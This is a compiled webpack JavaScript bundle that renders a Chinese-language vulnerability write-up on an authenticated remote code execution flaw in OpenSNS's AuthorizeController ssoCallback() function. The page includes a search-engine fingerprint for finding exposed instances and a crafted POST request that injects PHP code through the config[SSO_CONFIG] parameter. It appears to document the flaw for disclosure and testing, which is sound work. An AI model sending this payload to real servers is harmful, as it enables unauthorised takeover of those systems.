(window.webpackJsonp=window.webpackJsonp||[]).push([[108],{1121:function(t,s,a){t.exports=a.p+"assets/img/1634371874190-3653480e-380a-4cdc-81fc-7d560bc7d0dc-20220313235551772.af5bef0e.png"},1122:function(t,s,a){t.exports=a.p+"assets/img/1634375559893-600bdee5-03fe-4da2-8762-c41ded4f3797.65155533.png"},1123:function(t,s,a){t.exports=a.p+"assets/img/1634376077943-1f4ae612-7dc6-44a8-963d-0235ce16d1fd.c62be73c.png"},1124:function(t,s,a){t.exports=a.p+"assets/img/1634376114084-4e3cf1c1-1a1b-4169-bf65-322e2002a947.86ee3e23.png"},2774:function(t,s,a){"use strict";a.r(s);var e=a(64),r=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"opensns-authorizecontroller-class-php-后台远程命令执行漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#opensns-authorizecontroller-class-php-后台远程命令执行漏洞"}},[t._v("#")]),t._v(" OpenSNS AuthorizeController.class.php 后台远程命令执行漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("OpenSNS AuthorizeController.class.php文件 ssoCallback() 函数存在命令执行漏洞，在登录的情况下可以获取服务器权限")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("OpenSNS")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('icon_hash="1167011145"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("登录页面如下")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1121),alt:"img"}})]),t._v(" "),s("p",[t._v("存在漏洞的文件为 "),s("code",[t._v("Application/Admin/Controller/AuthorizeController.class.php")])]),t._v(" "),s("p",[s("img",{attrs:{src:a(1122),alt:"img"}})]),t._v(" "),s("p",[t._v("其中 config参数可控，构造请求就可以通过 file_put_contents 写入执行任意命令")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1123),alt:"img"}})]),t._v(" "),s("p",[t._v("构造请求包")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("admin"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("Authorize"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("ssoCallback\\\n\nconfig"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("SSO_CONFIG")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("phpinfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1124),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);